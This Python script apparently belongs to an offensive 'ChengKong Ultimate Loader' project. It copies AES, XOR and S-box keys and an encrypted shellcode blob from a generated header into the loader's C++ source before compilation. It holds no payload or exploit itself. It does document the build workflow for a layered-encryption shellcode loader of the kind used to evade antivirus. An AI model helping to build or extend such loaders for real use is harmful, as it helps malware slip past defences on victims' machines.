#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ChengKong Ultimate Loader - Update Shellcode Script
Author: ChengKong

This script updates the encrypted shellcode and keys in kong_ultimate.cpp
"""

import os
import sys

def main():
    # Get script directory
    script_dir = os.path.dirname(os.path.abspath(__file__))
    
    # Define paths relative to script directory
    header_file = os.path.join(script_dir, 'payload_x64_advanced.h')
    cpp_file = os.path.join(script_dir, '..', 'src', 'kong_ultimate.cpp')
    
    # Check if header file exists
    if not os.path.exists(header_file):
        print(f"[ERROR] Header file not found: {header_file}")
        print("[INFO] Please run advanced_encrypt_shellcode.py first")
        sys.exit(1)
    
    # Read the encrypted shellcode header
    print("[*] Reading encrypted shellcode header...")
    with open(header_file, 'r', encoding='utf-8') as f:
        content = f.read()
    
    # Extract individual components
    inv_sbox_start = content.find('unsigned char inv_sbox[]')
    xor_key_start = content.find('unsigned char xor_key[]')
    aes_key_start = content.find('unsigned char aes_key[]')
    aes_iv_start = content.find('unsigned char aes_iv[]')
    shellcode_start = content.find('unsigned char encrypted_shellcode[]')
    size_line = content.find('SIZE_T encrypted_size')
    
    if inv_sbox_start == -1 or xor_key_start == -1 or aes_key_start == -1:
        print("[ERROR] Could not find encryption keys in header file")
        sys.exit(1)
    
    # Extract each section
    inv_sbox_section = content[inv_sbox_start:xor_key_start].strip()
    xor_key_section = content[xor_key_start:aes_key_start].strip()
    aes_key_section = content[aes_key_start:aes_iv_start].strip()
    aes_iv_section = content[aes_iv_start:shellcode_start].strip()
    shellcode_section = content[shellcode_start:size_line].strip()
    
    print("[+] Extracted encryption keys and shellcode")
    
    # Check if cpp file exists
    if not os.path.exists(cpp_file):
        print(f"[ERROR] Source file not found: {cpp_file}")
        sys.exit(1)
    
    # Read kong_ultimate.cpp
    print("[*] Reading source file...")
    with open(cpp_file, 'r', encoding='utf-8') as f:
        kong_content = f.read()
    
    # Find the section to replace
    kong_start_marker = '// ================= 3-Layer Encryption Keys ================='
    kong_end_marker = '// ================= Secure Memory Functions ================='
    
    kong_start_idx = kong_content.find(kong_start_marker)
    kong_end_idx = kong_content.find(kong_end_marker)
    
    if kong_start_idx == -1 or kong_end_idx == -1:
        print("[ERROR] Could not find markers in kong_ultimate.cpp")
        print("[INFO] Make sure the source file has the correct structure")
        sys.exit(1)
    
    # Build the new section
    new_section = f'''// ================= 3-Layer Encryption Keys =================
// Inverse S-box for byte substitution (256 bytes)
{inv_sbox_section}

// XOR Key (32 bytes)
{xor_key_section}

// AES Key (16 bytes)
{aes_key_section}

// AES IV (16 bytes)
{aes_iv_section}

// Encrypted Shellcode
{shellcode_section}

'''
    
    # Replace the section
    new_kong_content = (
        kong_content[:kong_start_idx] +
        new_section +
        kong_content[kong_end_idx:]
    )
    
    # Write back
    print("[*] Updating source file...")
    with open(cpp_file, 'w', encoding='utf-8') as f:
        f.write(new_kong_content)
    
    print("[+] Successfully updated kong_ultimate.cpp")
    print("[+] Updated components:")
    print("    - Inverse S-box (256 bytes)")
    print("    - XOR Key (32 bytes)")
    print("    - AES Key (16 bytes)")
    print("    - AES IV (16 bytes)")
    print("    - Encrypted Shellcode")
    print("[+] Ready to compile!")

if __name__ == '__main__':
    main()
